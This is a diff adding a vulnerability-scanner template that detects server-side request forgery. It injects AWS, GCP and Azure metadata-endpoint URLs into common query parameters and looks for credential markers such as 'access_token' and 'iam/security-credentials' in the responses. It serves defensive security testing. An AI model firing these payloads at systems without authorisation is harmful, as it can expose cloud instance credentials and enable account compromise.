@@ -1,0 +1,47 @@
+id: ssrf-cloud-metadata
+
+info:
+  name: SSRF - Cloud Metadata Access
+  author: Kalkaneus Team
+  severity: critical
+  description: Detects SSRF vulnerabilities allowing access to cloud metadata endpoints
+  reference:
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+    - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
+  tags: ssrf,cloud,metadata,aws,gcp,azure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{Path}}{{Payload}}"
+    
+    payloads:
+      Path:
+        - "?url="
+        - "?uri="
+        - "?path="
+        - "?file="
+        - "?page="
+        - "?redirect="
+        - "?fetch="
+        - "?load="
+      Payload:
+        - "http://169.254.169.254/latest/meta-data/"
+        - "http://169.254.169.254/latest/user-data/"
+        - "http://metadata.google.internal/computeMetadata/v1/"
+        - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "computeMetadata"
+          - "access_token"
+          - "iam/security-credentials"
+        condition: or
+        
+      - type: status
+        status:
+          - 200
